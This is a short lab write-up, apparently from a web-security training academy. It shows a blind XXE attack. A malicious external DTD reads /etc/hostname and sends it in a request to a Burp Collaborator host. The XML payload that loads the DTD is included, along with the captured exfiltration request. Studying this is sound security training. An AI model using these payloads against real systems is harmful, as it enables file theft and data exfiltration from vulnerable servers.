# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
## Description
This was a pretty cool trick. Basically, we're using External DTD entities to build a dynamic XML parameter that extract data from the file system and injects that data into the out-of-band request sent to the collaboration server.


## Solution
Prepare server hosting a malicious DTD. For example:
`https://domain.com/malicious.dtd` hosting the following content:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://g2jpkklwqsbv96hs0odrqokr5ibazz.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;
```

Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac891fe91eecf58680755c26010300c0.web-security-academy.net/malicious.dtd"> %xxe;]>
<stockCheck>
  <productId>4</productId>
  <storeId>&xxe;</storeId>
</stockCheck>
```

Once executed, the XML parser will connect to the out-of-band collaboration server, sending a GET request similar to this where `0f021ab28f7c` is the content of `/etc/hostname`
```
GET /?x=0f021ab28f7c HTTP/1.1
User-Agent: Java/12.0.2
Host: g2jpkklwqsbv96hs0odrqokr5ibazz.burpcollaborator.net
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive

```